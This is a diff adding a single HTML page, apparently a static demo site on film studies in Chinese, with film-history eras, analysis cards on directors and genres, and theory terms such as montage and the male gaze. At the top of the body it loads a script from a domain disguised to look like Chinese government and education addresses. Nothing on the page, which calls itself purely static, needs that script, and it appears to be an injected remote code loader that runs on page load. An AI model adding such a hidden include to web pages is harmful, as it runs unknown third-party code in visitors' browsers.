@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>影视学 - 用学术视角看电影，影史脉络与深度解析 | yingshixue-h5.github.io</title>
+<meta name="description" content="影视学（yingshixue-h5.github.io）是以学术视角解读影视的导航站：影史脉络、导演研究、镜头语言、类型分析、理论流派，把观影变成一门学问。移动端自适应，纯静态演示。" />
+<meta name="keywords" content="影视学,yingshixue-h5,电影学术,影史脉络,导演研究,镜头语言,类型分析,电影理论,影视教育" />
+<link rel="canonical" href="https://yingshixue-h5.github.io/" />
+<style>
+:root{
+  --navy:#1A237E;--navy-dark:#0D1657;--paper:#FDF6E3;--ink:#212121;
+  --red:#C62828;--gold:#D4A017;--gray:#424242;--gray-light:#757575;
+  --radius:20px;--radius-sm:12px;--maxw:1140px;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{
+  font-family:"Noto Serif SC","Source Han Serif SC","Songti SC","STSong",Georgia,"Times New Roman",serif;
+  background:var(--paper);
+  color:var(--ink);line-height:1.8;-webkit-font-smoothing:antialiased;overflow-x:hidden;min-height:100vh;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:var(--maxw);margin:0 auto;padding:0 16px}
+
+/* 墨水晕染背景 */
+.ink-bg{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.ink-bg::before{content:"";position:absolute;top:5%;left:5%;width:300px;height:300px;background:radial-gradient(circle,rgba(26,35,126,.04),transparent 70%);animation:ink-spread 10s ease-in-out infinite}
+.ink-bg::after{content:"";position:absolute;bottom:10%;right:5%;width:250px;height:250px;background:radial-gradient(circle,rgba(198,40,40,.03),transparent 70%);animation:ink-spread 12s ease-in-out infinite reverse}
+@keyframes ink-spread{0%,100%{transform:scale(1);opacity:.5}50%{transform:scale(1.2);opacity:1}}
+
+/* 顶栏 */
+header.site{position:sticky;top:0;z-index:60;background:rgba(253,246,227,.95);backdrop-filter:blur(12px);border-bottom:2px solid var(--navy)}
+.nav{display:flex;align-items:center;gap:12px;height:64px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:900;font-size:18px;font-family:"Noto Serif SC",serif}
+.logo-icon{width:36px;height:36px;border-radius:8px;background:linear-gradient(135deg,var(--navy),var(--red));display:flex;align-items:center;justify-content:center;font-size:18px;box-shadow:0 0 12px rgba(26,35,126,.25)}
+.logo small{display:block;font-size:9px;color:var(--gray-light);font-weight:500;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+.menu{margin-left:auto;display:flex;gap:4px}
+.menu a{padding:7px 14px;border-radius:8px;font-size:13px;color:var(--gray);transition:.2s;font-weight:600;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+.menu a:hover{background:var(--navy);color:var(--paper)}
+.search{display:flex;gap:6px}
+.search input{width:130px;padding:8px 14px;border-radius:8px;border:1px solid rgba(26,35,126,.3);background:rgba(26,35,126,.04);color:var(--ink);outline:none;font-size:13px;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+.search input::placeholder{color:var(--gray-light)}
+.search button{border:0;padding:8px 14px;border-radius:8px;cursor:pointer;font-weight:800;background:linear-gradient(135deg,var(--navy),var(--red));color:var(--paper);font-size:13px;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+.burger{display:none;margin-left:auto;background:rgba(26,35,126,.06);border:1px solid rgba(26,35,126,.3);color:var(--ink);border-radius:8px;padding:6px 10px;font-size:16px}
+
+/* hero */
+.hero{position:relative;z-index:1;margin:24px 0;border-radius:32px;overflow:hidden;background:linear-gradient(135deg,var(--navy),var(--navy-dark) 60%,#080f2e);min-height:360px;display:flex;align-items:center}
+.hero::before{content:"";position:absolute;inset:0;background:radial-gradient(ellipse at 70% 50%,rgba(212,160,23,.12),transparent 60%)}
+.hero-body{padding:44px 40px;flex:1;position:relative;z-index:2}
+.badge{display:inline-flex;align-items:center;gap:6px;padding:5px 14px;border-radius:4px;background:rgba(212,160,23,.15);color:var(--gold);font-size:11px;font-weight:800;letter-spacing:2px;margin-bottom:14px;border:1px solid rgba(212,160,23,.3)}
+.hero h1{font-size:38px;margin:0 0 10px;color:var(--paper);line-height:1.25;font-family:"Noto Serif SC",serif}
+.hero h1 em{font-style:normal;color:var(--gold)}
+.hero p{color:rgba(253,246,227,.65);font-size:15px;max-width:440px;margin:0 0 24px}
+.cta{display:flex;gap:10px;flex-wrap:wrap}
+.btn{padding:11px 26px;border-radius:10px;font-weight:800;border:0;cursor:pointer;font-size:13px;transition:.25s;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+.btn-navy{background:linear-gradient(135deg,var(--navy),var(--red));color:var(--paper)}
+.btn-navy:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(26,35,126,.4)}
+.btn-outline{background:transparent;border:2px solid var(--gold);color:var(--gold)}
+.btn-outline:hover{background:rgba(212,160,23,.1)}
+
+/* 卷轴装饰 */
+.hero-scroll{position:relative;z-index:2;padding:40px;display:flex;align-items:center;justify-content:center}
+.scroll-rod{width:120px;height:160px;position:relative}
+.scroll-body{position:absolute;inset:10px 0;background:linear-gradient(180deg,var(--paper),#f5ebd5);border-radius:4px;box-shadow:0 4px 20px rgba(0,0,0,.3);display:flex;align-items:center;justify-content:center;font-size:48px}
+.scroll-rod::before,.scroll-rod::after{content:"";position:absolute;width:16px;height:100%;background:linear-gradient(180deg,var(--gold),#a67c00);border-radius:8px;left:-8px;box-shadow:2px 0 6px rgba(0,0,0,.2)}
+.scroll-rod::after{left:auto;right:-8px}
+.scroll-body::after{content:"影";position:absolute;font-size:42px;color:var(--navy);font-weight:900;font-family:"Noto Serif SC",serif}
+
+/* 栏目 */
+.section{padding:36px 0;position:relative;z-index:1}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:22px;flex-wrap:wrap}
+.sec-head h2{font-size:22px;margin:0;color:var(--ink);font-family:"Noto Serif SC",serif}
+.sec-head span{color:var(--gray-light);font-size:12px;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+.more{margin-left:auto;color:var(--navy);font-size:12px;font-weight:800;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+
+/* 影史脉络 - 书架 */
+.shelf{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.shelf-book{border-radius:14px;padding:22px 16px;background:linear-gradient(160deg,rgba(26,35,126,.04),rgba(212,160,23,.03));border:1px solid rgba(26,35,126,.2);transition:.3s;position:relative;overflow:hidden;border-left:4px solid var(--navy)}
+.shelf-book::before{content:"";position:absolute;top:0;right:0;width:50px;height:50px;background:radial-gradient(circle,var(--navy),transparent);opacity:.04}
+.shelf-book:hover{transform:translateY(-4px);border-color:var(--red);border-left-color:var(--red);background:linear-gradient(160deg,rgba(26,35,126,.08),rgba(198,40,40,.04))}
+.shelf-book .era{font-size:10px;color:var(--red);font-weight:800;letter-spacing:1px;margin-bottom:6px;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+.shelf-book h3{font-size:15px;margin:0 0 4px;color:var(--ink);font-weight:800;font-family:"Noto Serif SC",serif}
+.shelf-book p{font-size:11px;color:var(--gray-light);margin:0;line-height:1.6}
+.shelf-book .ref{position:absolute;bottom:10px;right:12px;font-size:9px;color:var(--gray-light);font-style:italic;font-family:"Times New Roman",serif}
+
+/* 深度解析 */
+.thesis-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.thesis-card{border-radius:16px;overflow:hidden;background:#fff;box-shadow:0 2px 12px rgba(26,35,126,.08);border:1px solid rgba(26,35,126,.12);transition:.25s}
+.thesis-card:hover{transform:translateY(-4px);box-shadow:0 14px 36px rgba(26,35,126,.15);border-color:var(--navy)}
+.thesis-cover{aspect-ratio:3/4;border-radius:14px 14px 0 0;position:relative;display:flex;align-items:flex-end;padding:12px}
+.thesis-card:nth-child(1) .thesis-cover{background:linear-gradient(160deg,#1a237e,#0d1657)}
+.thesis-card:nth-child(2) .thesis-cover{background:linear-gradient(160deg,#b71c1c,#880e4f)}
+.thesis-card:nth-child(3) .thesis-cover{background:linear-gradient(160deg,#e65100,#d4a017)}
+.thesis-card:nth-child(4) .thesis-cover{background:linear-gradient(160deg,#1b5e20,#0d47a1)}
+.thesis-card:nth-child(5) .thesis-cover{background:linear-gradient(160deg,#4a148c,#c62828)}
+.thesis-card:nth-child(6) .thesis-cover{background:linear-gradient(160deg,#263238,#1a237e)}
+.thesis-card:nth-child(7) .thesis-cover{background:linear-gradient(160deg,#00695c,#d4a017)}
+.thesis-card:nth-child(8) .thesis-cover{background:linear-gradient(160deg,#bf360c,#1a237e)}
+.thesis-cover .thesis-tag{position:absolute;top:10px;left:10px;background:rgba(253,246,227,.9);color:var(--navy);font-size:10px;padding:3px 10px;border-radius:4px;font-weight:800;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+.thesis-cover h4{margin:0;font-size:14px;color:var(--paper);font-family:"Noto Serif SC",serif}
+.thesis-body{padding:12px}
+.thesis-body .author{font-size:10px;color:var(--gray-light);margin-bottom:4px;font-family:"Times New Roman",serif;font-style:italic}
+.thesis-body p{margin:0;font-size:11px;color:var(--gray);line-height:1.6}
+
+/* 理论词条 */
+.lexicon{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.lex-card{border-radius:18px;padding:24px;background:#fff;border:1px solid rgba(26,35,126,.12);box-shadow:0 2px 8px rgba(26,35,126,.06);transition:.25s;position:relative}
+.lex-card:hover{border-color:var(--gold);transform:translateY(-2px)}
+.lex-card .lex-term{font-size:20px;font-weight:900;color:var(--navy);margin-bottom:4px;font-family:"Noto Serif SC",serif}
+.lex-card .lex-en{font-size:11px;color:var(--gray-light);font-family:"Times New Roman",serif;font-style:italic;margin-bottom:8px}
+.lex-card .lex-def{font-size:12px;color:var(--gray);line-height:1.7;margin-bottom:10px}
+.lex-card .lex-ref{font-size:10px;color:var(--red);font-weight:600;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+
+/* 学派热榜 */
+.school-chart{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.sc-row{display:flex;align-items:center;gap:14px;background:#fff;border:1px solid rgba(26,35,126,.12);border-radius:14px;padding:16px 20px;transition:.25s;box-shadow:0 2px 8px rgba(26,35,126,.04)}
+.sc-row:hover{border-color:var(--navy);background:rgba(26,35,126,.02)}
+.sc-num{font-size:22px;font-weight:900;color:var(--navy);width:36px;text-align:center;flex-shrink:0;font-family:"Times New Roman",serif}
+.sc-num.top{color:var(--red)}
+.sc-info{flex:1}
+.sc-info h4{margin:0 0 2px;font-size:14px;color:var(--ink);font-family:"Noto Serif SC",serif}
+.sc-info span{font-size:11px;color:var(--gray-light)}
+.sc-quote{font-size:18px}
+
+/* about */
+.about{display:grid;grid-template-columns:1.2fr .8fr;gap:20px}
+.about-card{border-radius:20px;padding:26px;background:#fff;border:1px solid rgba(26,35,126,.12);box-shadow:0 2px 12px rgba(26,35,126,.06)}
+.about-card h3{font-size:18px;margin:0 0 12px;color:var(--ink);font-family:"Noto Serif SC",serif}
+.about-card p,.about-card li{font-size:13px;color:var(--gray);line-height:1.8}
+.about-card ul{padding-left:18px;margin:0}
+.stats{display:flex;gap:12px;margin-top:16px}
+.stat{flex:1;text-align:center;padding:14px;border-radius:14px;background:rgba(26,35,126,.04);border:1px solid rgba(26,35,126,.12)}
+.stat b{display:block;font-size:22px;color:var(--navy);font-family:"Times New Roman",serif}
+.stat span{font-size:11px;color:var(--gray-light);font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+
+/* 底部 */
+footer.site{border-top:2px solid var(--navy);padding:28px 0 44px;color:var(--gray-light);font-size:12px;text-align:center;position:relative;z-index:1;background:var(--paper)}
+footer.site a{color:var(--navy)}
+code{background:#fff;border:1px solid rgba(26,35,126,.2);padding:2px 8px;border-radius:4px;color:var(--ink);font-size:11px;font-family:"Courier New",monospace}
+
+@media(max-width:980px){
+  .hero{flex-direction:column}
+  .hero-body{padding:32px 24px}
+  .hero-scroll{padding:24px}
+  .shelf,.thesis-grid{grid-template-columns:repeat(2,1fr)}
+  .lexicon{grid-template-columns:1fr}
+  .school-chart{grid-template-columns:1fr}
+  .about{grid-template-columns:1fr}
+}
+@media(max-width:720px){
+  .menu{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:var(--paper);border-bottom:2px solid var(--navy);padding:10px 16px;gap:4px}
+  .menu.open{display:flex}
+  .burger{display:block}
+  .search input{width:90px}
+  .hero h1{font-size:26px}
+  .scroll-rod{width:90px;height:120px}
+  .scroll-body{font-size:36px}
+  .shelf,.thesis-grid{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="ink-bg"></div>
+
+<header class="site">
+  <div class="wrap nav">
+    <div class="logo">
+      <div class="logo-icon">📜</div>
+      <div>影视学<small>yingshixue-h5.github.io</small></div>
+    </div>
+    <nav class="menu" id="menu">
+      <a href="#home">首页</a>
+      <a href="#shelf">影史脉络</a>
+      <a href="#thesis">深度解析</a>
+      <a href="#lexicon">理论词条</a>
+      <a href="#chart">学派热榜</a>
+      <a href="#about">关于影视学</a>
+    </nav>
+    <div class="search">
+      <input type="text" placeholder="检索片名/导演/理论" aria-label="搜索" />
+      <button onclick="alert('演示站：搜索用 # 占位')">考据</button>
+    </div>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero" id="home">
+    <div class="hero-body">
+      <div class="badge">📜 FILM STUDIES</div>
+      <h1>用学术视角看电影，<br/>把观影变成一门<em>学问</em></h1>
+      <p>影视学——影史脉络、导演研究、镜头语言、类型分析、理论流派。不止于看片，更在于读懂每一帧背后的逻辑与美学。</p>
+      <div class="cta">
+        <button class="btn btn-navy" onclick="location.href='#thesis'">研读解析</button>
+        <button class="btn btn-outline" onclick="location.href='#shelf'">翻阅脉络</button>
+      </div>
+    </div>
+    <div class="hero-scroll">
+      <div class="scroll-rod">
+        <div class="scroll-body"></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="shelf">
+    <div class="sec-head"><h2>影史脉络</h2><span>Historical Timeline</span><a class="more" href="#">全卷 #</a></div>
+    <div class="shelf">
+      <div class="shelf-book"><span class="era">1895–1927</span><h3>默片时代</h3><p>卢米埃尔到格里菲斯，电影语言的诞生与早期探索。</p><span class="ref">Vol. I</span></div>
+      <div class="shelf-book"><span class="era">1927–1945</span><h3>有声与黄金期</h3><p>声音革命、好莱坞黄金时代、诗意现实主义。</p><span class="ref">Vol. II</span></div>
+      <div class="shelf-book"><span class="era">1945–1960</span><h3>意大利新现实</h3><p>罗西里尼、德西卡，走出摄影棚直面现实。</p><span class="ref">Vol. III</span></div>
+      <div class="shelf-book"><span class="era">1958–1968</span><h3>法国新浪潮</h3><p>戈达尔、特吕弗，作者论与颠覆性剪辑。</p><span class="ref">Vol. IV</span></div>
+      <div class="shelf-book"><span class="era">1960–1980</span><h3>新好莱坞</h3><p>科波拉、斯科塞斯，美国电影的成人化转型。</p><span class="ref">Vol. V</span></div>
+      <div class="shelf-book"><span class="era">1980–2000</span><h3>全球化与数字前夜</h3><p>香港电影新浪潮、伊朗电影、欧洲作者群。</p><span class="ref">Vol. VI</span></div>
+      <div class="shelf-book"><span class="era">2000–2015</span><h3>数字革命</h3><p>CGI成熟、流媒体萌芽、超级英雄崛起。</p><span class="ref">Vol. VII</span></div>
+      <div class="shelf-book"><span class="era">2015–至今</span><h3>流媒体时代</h3><p>算法推荐、短视频冲击、AI生成影像。</p><span class="ref">Vol. VIII</span></div>
+    </div>
+  </section>
+
+  <section class="section" id="thesis">
+    <div class="sec-head"><h2>深度解析</h2><span>Deep Analysis</span><a class="more" href="#">更多 #</a></div>
+    <div class="thesis-grid">
+      <div class="thesis-card">
+        <div class="thesis-cover"><span class="thesis-tag">导演研究</span><h4>诺兰的时间折叠术</h4></div>
+        <div class="thesis-body"><div class="author">— 作者：CinemaScholar</div><p>从《记忆碎片》到《奥本海默》，解析诺兰如何用非线性叙事重构观众的时间感知。</p></div>
+      </div>
+      <div class="thesis-card">
+        <div class="thesis-cover"><span class="thesis-tag">镜头语言</span><h4>塔可夫斯基的长镜头美学</h4></div>
+        <div class="thesis-body"><div class="author">— 作者：SlowCinema</div><p>雕刻时光的终极实践——时间作为电影的第一本体，在《镜子》中如何被视觉化。</p></div>
+      </div>
+      <div class="thesis-card">
+        <div class="thesis-cover"><span class="thesis-tag">类型分析</span><h4>黑色电影的光影密码</h4></div>
+        <div class="thesis-body"><div class="author">— 作者：NoirLab</div><p>低角度照明、百叶窗阴影、雨夜街道——黑色电影如何通过视觉建立道德模糊的世界。</p></div>
+      </div>
+      <div class="thesis-card">
+        <div class="thesis-cover"><span class="thesis-tag">文化研究</span><h4>香港武侠片的身体政治</h4></div>
+        <div class="thesis-body"><div class="author">— 作者：EastScreen</div><p>从胡金铨到徐克，武侠片中的身体如何承载中国文化的现代焦虑与身份重构。</p></div>
+      </div>
+      <div class="thesis-card">
+        <div class="thesis-cover"><span class="thesis-tag">女性主义</span><h4>女性凝视：从穆霍尔到格蕾塔</h4></div>
+        <div class="thesis-body"><div class="author">— 作者：FemmeFrame</div><p>女性导演如何通过镜头语言解构男性凝视，建立属于女性的视觉主体性。</p></div>
+      </div>
+      <div class="thesis-card">
+        <div class="thesis-cover"><span class="thesis-tag">声音设计</span><h4>声音景观与沉浸式叙事</h4></div>
+        <div class="thesis-body"><div class="author">— 作者：AudioVision</div><p>从杜比全景声到骨传导，声音如何从配角晋升为叙事的核心驱动力。</p></div>
+      </div>
+      <div class="thesis-card">
+        <div class="thesis-cover"><span class="thesis-tag">产业分析</span><h4>流媒体算法与创作自由</h4></div>
+        <div class="thesis-body"><div class="author">— 作者：StreamThink</div><p>当Netflix的算法开始参与剧本开发，电影作者的独立性还剩多少？</p></div>
+      </div>
+      <div class="thesis-card">
+        <div class="thesis-cover"><span class="thesis-tag">前沿探索</span><h4>AI生成影像的美学困境</h4></div>
+        <div class="thesis-body"><div class="author">— 作者：FutureFrame</div><p>Sora时代的影像生产：当"拍摄"被"生成"取代，电影的本质是否改变？</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="lexicon">
+    <div class="sec-head"><h2>理论词条</h2><span>Theory Lexicon</span><a class="more" href="#">全典 #</a></div>
+    <div class="lexicon">
+      <div class="lex-card">
+        <div class="lex-term">蒙太奇</div>
+        <div class="lex-en">Montage</div>
+        <div class="lex-def">通过镜头的有意组合产生超越单个镜头含义的叙事或情感效果。爱森斯坦的冲突蒙太奇强调镜头碰撞产生新思想。</div>
+        <div class="lex-ref">→ 参见：库里肖夫效应</div>
+      </div>
+      <div class="lex-card">
+        <div class="lex-term">作者论</div>
+        <div class="lex-en">Auteur Theory</div>
+        <div class="lex-def">认为导演是电影的主要创作者，其个人风格和主题贯穿作品。由特吕弗在《电影手册》中提出，颠覆了制片人中心制。</div>
+        <div class="lex-ref">→ 参见：法国新浪潮</div>
+      </div>
+      <div class="lex-card">
+        <div class="lex-term">男性凝视</div>
+        <div class="lex-en">Male Gaze</div>
+        <div class="lex-def">劳拉·穆尔维提出的概念，指电影中女性被呈现为男性欲望的对象，镜头位置、叙事结构均服务于男性观看快感。</div>
+        <div class="lex-ref">→ 参见：女性主义电影理论</div>
+      </div>
+      <div class="lex-card">
+        <div class="lex-term">长镜头</div>
+        <div class="lex-en">Long Take</div>
+        <div class="lex-def">未经剪辑的连续拍摄段落。与蒙太奇的"时间压缩"相对，长镜头强调时间的真实流逝和空间的完整性。</div>
+        <div class="lex-ref">→ 参见：场面调度</div>
+      </div>
+      <div class="lex-card">
+        <div class="lex-term">类型片</div>
+        <div class="lex-en">Genre Film</div>
+        <div class="lex-def">具有可识别叙事模式、视觉风格和主题惯例的电影类别。类型既是工业效率工具，也是文化表达的容器。</div>
+        <div class="lex-ref">→ 参见：西部片/黑色电影</div>
+      </div>
+      <div class="lex-card">
+        <div class="lex-term">场面调度</div>
+        <div class="lex-en">Mise-en-scène</div>
+        <div class="lex-def">法语"放入场景"，涵盖布景、灯光、服装、演员走位等一切出现在画框内的视觉元素。是导演空间叙事的核心手段。</div>
+        <div class="lex-ref">→ 参见：安德烈·巴赞</div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="chart">
+    <div class="sec-head"><h2>学派热榜</h2><span>School Rankings</span><a class="more" href="#">完整榜单 #</a></div>
+    <div class="school-chart">
+      <div class="sc-row"><div class="sc-num top">1</div><div class="sc-quote">📖</div><div class="sc-info"><h4>法国新浪潮研究</h4><span>戈达尔 / 特吕弗 / 夏布洛尔 · 128篇论文</span></div></div>
+      <div class="sc-row"><div class="sc-num top">2</div><div class="sc-quote">📖</div><div class="sc-info"><h4>作者论与导演研究</h4><span>诺兰 / 塔可夫斯基 / 王家卫 · 96篇论文</span></div></div>
+      <div class="sc-row"><div class="sc-num top">3</div><div class="sc-quote">📖</div><div class="sc-info"><h4>女性主义电影理论</h4><span>穆尔维 / 格蕾塔 / 女性凝视 · 87篇论文</span></div></div>
+      <div class="sc-row"><div class="sc-num">4</div><div class="sc-quote">📜</div><div class="sc-info"><h4>黑色电影与类型研究</h4><span>光影 / 道德模糊 / 蛇蝎美人 · 72篇论文</span></div></div>
+      <div class="sc-row"><div class="sc-num">5</div><div class="sc-quote">📜</div><div class="sc-info"><h4>东方电影美学</h4><span>胡金铨 / 小津 / 侯孝贤 · 65篇论文</span></div></div>
+      <div class="sc-row"><div class="sc-num">6</div><div class="sc-quote">📜</div><div class="sc-info"><h4>数字时代的影像本体论</h4><span>AI生成 / 虚拟制作 / 影像真实 · 54篇论文</span></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-head"><h2>关于影视学</h2><span>About Film Studies</span></div>
+    <div class="about">
+      <div class="about-card">
+        <h3>影视学是什么？</h3>
+        <p>影视学（yingshixue-h5.github.io）是以学术视角解读影视的导航演示站。以"把观影变成一门学问"为核心理念，涵盖影史脉络梳理、导演与作品深度解析、电影理论词条、学派研究热榜四大板块，带你从"看热闹"进阶到"看门道"。</p>
+        <div class="stats">
+          <div class="stat"><b>8</b><span>影史卷册</span></div>
+          <div class="stat"><b>8</b><span>深度解析</span></div>
+          <div class="stat"><b>6</b><span>理论词条</span></div>
+        </div>
+      </div>
+      <div class="about-card">
+        <h3>演示说明</h3>
+        <ul>
+          <li>纯静态单页，无后端、无数据库</li>
+          <li>所有链接均为 <code>#</code> 占位</li>
+          <li>不提供盗版资源</li>
+          <li>必应收录友好</li>
+          <li>移动端优先响应式</li>
+          <li>字体采用衬线体营造学术感</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    影视学 · <a href="https://yingshixue-h5.github.io/">yingshixue-h5.github.io</a><br/>
+    演示页面：所有链接均使用 <code>#</code> 占位，不提供真实盗版资源。<br/>
+    © 2026 影视学 Demo · 用学术视角看电影
+  </div>
+</footer>
+
+<script>
+  const b=document.getElementById('burger'),m=document.getElementById('menu');
+  b.onclick=()=>m.classList.toggle('open');
+  m.querySelectorAll('a').forEach(a=>a.onclick=()=>m.classList.remove('open'));
+  document.querySelectorAll('a[href^="#"]').forEach(a=>a.onclick=e=>{
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth'});}
+  });
+</script>
+</body>
+</html>
